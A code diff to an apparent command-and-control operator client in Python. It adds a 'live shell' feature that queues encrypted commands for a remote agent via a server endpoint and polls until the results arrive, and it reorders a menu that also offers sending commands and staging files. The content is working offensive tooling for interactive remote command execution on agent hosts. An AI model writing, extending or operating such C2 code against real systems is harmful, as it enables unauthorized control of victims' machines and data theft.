@@ -1,4 +1,4 @@
-import requests
+import requests, time
 import sys
 import json
 import base64
@@ -130,6 +130,37 @@ def stage_file():
     except Exception as e:
         print(RED + f"[!] Failed to stage file: {e}" + RESET)
 
+def live_shell():
+    agent_id = input("Enter Agent Id: ").strip()
+
+    while True:
+        command = input(f"{agent_id}$ ").strip()
+        if command.lower() in ["exit", "quit", "back"]:
+            print("[*] Leaving live shell...")
+            break
+
+        # Queue the command (encrypted)
+        payload = {"agent_id": agent_id, "command": encrypt(command)}
+        r = requests.post(f"{SERVER_URL}/queue", json=payload, timeout=10)
+        r.raise_for_status()
+        resp = r.json()
+        cmd_id = resp["command_id"]
+
+        # Poll until result is ready
+        while True:
+            time.sleep(1)
+            agent_resp = requests.get(f"{SERVER_URL}/agents/{agent_id}", timeout=10)
+            agent_resp.raise_for_status()
+            agent_data = agent_resp.json()
+
+            for c in agent_data["Commands"]:
+                if c["Command Id"] == cmd_id and c["Status"] == "Completed":
+                    print(c["Result"])
+                    break
+            else:
+                continue
+            break
+
 
 def main():
     while True:
@@ -141,8 +172,9 @@ def main():
         print("3. Send command to agent")
         print("4. List queued tasks")
         print("5. List completed tasks")
-        print("6. Stage a file on server")
-        print("7. Exit" + RESET)
+        print("6. Live Shell")
+        print("7. Stage a file on server")
+        print("8. Exit" + RESET)
 
         choice = input("Select an option: ").strip()
         print("\n")
@@ -158,8 +190,10 @@ def main():
         elif choice == "5":
             list_tasks("Completed")
         elif choice == "6":
-            stage_file()
+            live_shell()
         elif choice == "7":
+            stage_file()
+        elif choice == "8":
             print("Exiting...")
             sys.exit(0)
         else:
